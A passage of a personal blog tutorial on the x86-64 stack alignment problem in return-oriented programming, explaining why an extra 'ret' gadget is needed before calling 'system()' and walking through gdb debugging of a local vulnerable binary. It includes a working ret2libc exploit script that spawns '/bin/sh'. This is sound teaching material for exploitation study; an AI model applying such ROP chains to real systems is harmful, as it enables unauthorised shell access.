</code></pre><p>‍</p><p>The key is that <strong>just before calling</strong> <strong>​<code>system()</code>​</strong> ​ <strong>(i.e. at the entry to</strong> <strong>​<code>system</code>​</strong>​ <strong>) the stack pointer</strong> <strong>​<code>%rsp</code>​</strong>​ <strong>must satisfy the AMD64 ABI’s alignment requirements</strong>. By the AMD64 ABI, RSP must be <strong>16-byte aligned at every</strong> <strong>​<code>call</code>​</strong>​ <strong>instruction.</strong></p><p>‍</p><p><strong>Before any</strong> <strong>​<code>call</code>​</strong>​ <strong>instruction</strong>, <code>%rsp</code>​ <strong>must</strong> be a multiple of 16</p><blockquote><p>“Just before <code>call</code>​, <code>%rsp % 16 == 0</code>​​. On function entry, <code>%rsp % 16 == 8</code>​​.”</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-lua data-lang=lua><span class=line><span class=cl><span class=o>%</span><span class=n>rsp</span> <span class=err>≡</span> <span class=mi>0</span> <span class=n>mod</span> <span class=mi>16</span>   <span class=c1>----&gt;  rsp % 16 = 0</span>
</span></span></code></pre></div><p>The address of rsp should be the multiple of 16.</p><p>‍</p><p>Lets go the our Vulnerable Binary, run it again inside gdb.</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250619002842-wkfelpx.png>hit the breakpoint at the ret instruction.</p><p>​​</p><p>ret will take the address of our gadget pop rdi ; ret and load it inside the rip</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-mathematica data-lang=mathematica><span class=line><span class=cl><span class=n>gef</span><span class=err>➤</span><span class=w> </span><span class=n>si</span><span class=w>
</span></span></span></code></pre></div><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250619003923-j4iqz3d.png></p><p>‍</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250619003548-lfviv2n.png></p><p>‍</p><p><strong>Remember that rule?</strong></p><blockquote><p>“Just before <code>call</code>​, <code>%rsp % 16 == 0</code>​​. On function entry, <code>%rsp % 16 == 8</code>​​.”</p></blockquote><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250619004408-4a7qs9c.png></p><p>Just Before call, <code>%rsp % 16 == 0</code>​​ . but we are getting</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-mathematica data-lang=mathematica><span class=line><span class=cl><span class=n>gef</span><span class=err>➤</span><span class=w>  </span><span class=o>!</span><span class=n>python3</span><span class=w> </span><span class=o>-</span><span class=n>c</span><span class=w> </span><span class=err>&#39;</span><span class=n>print</span><span class=p>(</span><span class=mi>0</span><span class=n>x00007fffffffdd08</span><span class=w> </span><span class=err>%</span><span class=w> </span><span class=mi>16</span><span class=p>)</span><span class=err>&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>8</span><span class=w>
</span></span></span></code></pre></div><p>Now thats where the problem is.</p><p>‍</p><p><strong>Now we are at the entry of the system function</strong></p><blockquote><p>ABI expects &ndash; On function entry, <code>%rsp % 16 == 8</code>​​.</p><p>but we are getting <code>%rsp % 16 == 0</code>​​</p></blockquote><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250619005243-acxi4zk.png></p><p>‍</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-mathematica data-lang=mathematica><span class=line><span class=cl><span class=n>Correct</span><span class=w> </span><span class=n>Stack</span><span class=w> </span><span class=n>Alignment</span><span class=err>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>rsp</span><span class=w> </span><span class=err>%</span><span class=w> </span><span class=mi>16</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>8</span><span class=w>       </span><span class=o>&lt;-</span><span class=w> </span><span class=n>This</span><span class=w> </span><span class=n>is</span><span class=w> </span><span class=n>what</span><span class=w> </span><span class=n>ABI</span><span class=w> </span><span class=n>expects</span><span class=w> </span><span class=n>after</span><span class=w> </span><span class=err>&#39;</span><span class=n>call</span><span class=err>&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>system</span><span class=p>()</span><span class=w> </span><span class=n>works</span><span class=w> </span><span class=n>fine</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Misaligned</span><span class=w> </span><span class=n>Stack</span><span class=err>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>rsp</span><span class=w> </span><span class=err>%</span><span class=w> </span><span class=mi>16</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=w>       </span><span class=o>&lt;-</span><span class=w> </span><span class=n>Due</span><span class=w> </span><span class=n>to</span><span class=w> </span><span class=n>raw</span><span class=w> </span><span class=n>ROP</span><span class=w> </span><span class=n>chain</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>and</span><span class=w> </span><span class=n>you</span><span class=w> </span><span class=n>get</span><span class=w> </span><span class=n>that</span><span class=w> </span><span class=n>Movaps</span><span class=w> </span><span class=n>issue</span><span class=w>
</span></span></span></code></pre></div><p>‍</p><p>When you normally call a function on x86_64, the hardware does two things under the hood:</p><ol><li><p>​<strong>​<code>call target</code>​</strong>​</p><ul><li>Pushes the <strong>return address</strong> (8 bytes) onto the stack</li><li>Decrements <code>rsp</code>​ by 8 (stack grows downward)</li><li>Jumps to <code>target</code>​</li></ul></li></ol><p>‍</p><blockquote><p><strong>Inside the callee</strong>, on entry you see <code>rsp % 16 == 8</code>​​ — exactly what the ABI expects.</p></blockquote><p>‍</p><p>However, in a ROP chain you don’t use <code>call</code>​; you stitch together a series of <strong>​<code>ret</code>​</strong>​ instructions instead. Each <code>ret</code>​ does:</p><ul><li>Pop the top 8 bytes from the stack into the instruction pointer</li><li>Increments <code>rsp</code>​ by 8 (stack “shrinks” upward)</li></ul><p>‍</p><p>Therefore, If you build a ROP chain without caring about alignment, each gadget’s <code>ret</code>​ will keep adding +8 to <code>rsp</code>​. By the time you hit <code>system()</code>​, your <code>rsp</code>​ can be at a multiple of 16 (i.e. <code>rsp % 16 == 0</code>​), which the ABI <strong>does not</strong> allow on function entry. Glibc then immediately executes a <code>movaps</code>​ on the (misaligned) stack and you get a General Protection Fault.</p><p>‍</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250619010638-pkl4ew5.png></p><p>‍</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250619011149-g8u69fa.png></p><p><strong>Updated Exploit</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-mathematica data-lang=mathematica><span class=line><span class=cl><span class=n>File</span><span class=err>:</span><span class=w> </span><span class=n>exploit</span><span class=err>.</span><span class=n>py</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=mi>1</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=n>import</span><span class=w> </span><span class=n>struct</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=mi>2</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=nv>libc_base</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x7ffff7da9000</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=mi>3</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>b</span><span class=s>&#34;A&#34;</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mi>8</span><span class=w>                                           </span><span class=nv>#</span><span class=w> </span><span class=n>offset</span><span class=w> </span><span class=n>to</span><span class=w> </span><span class=n>rbp</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=mi>4</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>b</span><span class=s>&#34;B&#34;</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mi>8</span><span class=w>                                          </span><span class=nv>#</span><span class=w> </span><span class=n>rbp</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=mi>5</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>struct</span><span class=err>.</span><span class=n>pack</span><span class=p>(</span><span class=s>&#34;&lt;Q&#34;</span><span class=p>,</span><span class=w> </span><span class=nv>libc_base</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>0</span><span class=n>x00000000000f7bb3</span><span class=p>)</span><span class=w> </span><span class=nv>#</span><span class=w> </span><span class=n>ret</span><span class=p>;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=mi>6</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>struct</span><span class=err>.</span><span class=n>pack</span><span class=p>(</span><span class=s>&#34;&lt;Q&#34;</span><span class=p>,</span><span class=w> </span><span class=nv>libc_base</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>0</span><span class=n>x000000000002a145</span><span class=p>)</span><span class=w> </span><span class=nv>#</span><span class=w> </span><span class=n>pop</span><span class=w> </span><span class=n>rdi</span><span class=p>;</span><span class=w> </span><span class=n>ret</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=mi>7</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>struct</span><span class=err>.</span><span class=n>pack</span><span class=p>(</span><span class=s>&#34;&lt;Q&#34;</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x7ffff7f50ea4</span><span class=p>)</span><span class=w>                 </span><span class=nv>#</span><span class=w> </span><span class=n>address</span><span class=w> </span><span class=n>of</span><span class=w> </span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=mi>8</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>struct</span><span class=err>.</span><span class=n>pack</span><span class=p>(</span><span class=s>&#34;&lt;Q&#34;</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x7ffff7dfc110</span><span class=p>)</span><span class=w>                 </span><span class=nv>#</span><span class=w> </span><span class=n>address</span><span class=w> </span><span class=n>of</span><span class=w> </span><span class=n>System</span><span class=w> </span><span class=n>function</span><span class=p>()</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=mi>9</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>struct</span><span class=err>.</span><span class=n>pack</span><span class=p>(</span><span class=s>&#34;&lt;Q&#34;</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x7ffff7deb340</span><span class=p>)</span><span class=w>                 </span><span class=nv>#</span><span class=w> </span><span class=n>address</span><span class=w> </span><span class=n>of</span><span class=w> </span><span class=n>exit</span><span class=w> </span><span class=n>function</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=mi>10</span><span class=w>   </span><span class=err>│</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=mi>11</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=nv>#</span><span class=n>we</span><span class=w> </span><span class=n>are</span><span class=w> </span><span class=n>using</span><span class=w> </span><span class=n>option</span><span class=w> </span><span class=o>&lt;</span><span class=n>Q</span><span class=o>&gt;</span><span class=p>,</span><span class=w> </span><span class=n>because</span><span class=w> </span><span class=n>we</span><span class=w> </span><span class=n>want</span><span class=w> </span><span class=n>to</span><span class=w> </span><span class=n>convert</span><span class=w> </span><span class=n>these</span><span class=w> </span><span class=mi>64</span><span class=w> </span><span class=n>bit</span><span class=w> </span><span class=n>addresses</span><span class=w> </span><span class=n>to</span><span class=w> </span><span class=n>little</span><span class=w> </span><span class=n>endian</span><span class=w> </span><span class=n>format</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=mi>12</span><span class=w>   </span><span class=err>│</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=mi>13</span><span class=w>   </span><span class=err>│</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=mi>14</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=nv>#</span><span class=w> </span><span class=n>print</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=mi>15</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=n>with</span><span class=w> </span><span class=n>open</span><span class=p>(</span><span class=s>&#34;exploit1&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;wb&#34;</span><span class=p>)</span><span class=w> </span><span class=n>as</span><span class=w> </span><span class=n>f</span><span class=err>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=mi>16</span><span class=w>   </span><span class=err>│</span><span class=w>     </span><span class=n>f</span><span class=err>.</span><span class=n>write</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=mi>17</span><span class=w>   </span><span class=err>│</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=mi>18</span><span class=w>   </span><span class=err>│</span><span class=w> </span><span class=n>print</span><span class=p>(</span><span class=s>&#34;Payload written to exploit1. Run with: `./vulnerable_program &lt; input.txt`&#34;</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></div><p>‍</p><p>‍</p><p>Lets verify our exploit</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250619011556-78v07je.png></p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250619011932-m4z3440.png></p><p>‍</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250619012146-bg66slu.png></p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250619012215-ofbgg3u.png></p><p>So, hope you guys now have finally understood the stack allignment problem, and why use that extra ret gadget.</p><p>Happy hacking ;)</p><p>‍</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=//localhost:35623/blogs/brbbot-analysis/><span class=title>Next »</span><br><span>Analysing Brbbot</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share The Stack allignment problem on x" href="https://x.com/intent/tweet/?text=The%20Stack%20allignment%20problem&amp;url=%2f%2flocalhost%3a35623%2fblogs%2fstack-allignment-problem%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share The Stack allignment problem on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2f%2flocalhost%3a35623%2fblogs%2fstack-allignment-problem%2f&amp;title=The%20Stack%20allignment%20problem&amp;summary=The%20Stack%20allignment%20problem&amp;source=%2f%2flocalhost%3a35623%2fblogs%2fstack-allignment-problem%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share The Stack allignment problem on reddit" href="https://reddit.com/submit?url=%2f%2flocalhost%3a35623%2fblogs%2fstack-allignment-problem%2f&title=The%20Stack%20allignment%20problem"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share The Stack allignment problem on facebook" href="https://facebook.com/sharer/sharer.php?u=%2f%2flocalhost%3a35623%2fblogs%2fstack-allignment-problem%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share The Stack allignment problem on whatsapp" href="https://api.whatsapp.com/send?text=The%20Stack%20allignment%20problem%20-%20%2f%2flocalhost%3a35623%2fblogs%2fstack-allignment-problem%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share The Stack allignment problem on telegram" href="https://telegram.me/share/url?text=The%20Stack%20allignment%20problem&amp;url=%2f%2flocalhost%3a35623%2fblogs%2fstack-allignment-problem%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share The Stack allignment problem on ycombinator" href="https://news.ycombinator.com/submitlink?t=The%20Stack%20allignment%20problem&u=%2f%2flocalhost%3a35623%2fblogs%2fstack-allignment-problem%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=//localhost:35623/>Rahul Mishra</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>